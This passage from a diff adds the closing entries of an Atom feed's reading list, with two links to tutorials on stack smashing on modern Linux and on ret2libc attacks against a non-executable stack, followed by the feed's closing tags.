+<li><a href="https://www.soldierx.com/tutorials/Stack-Smashing-Modern-Linux-System">Stack Smashing On A Modern Linux System</a></li>
+<li><a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">Performing a ret2libc Attack (defeating a non-executable stack)</a></li>
+</ul>
+
+]]></content>
+  </entry>
+  
+</feed>
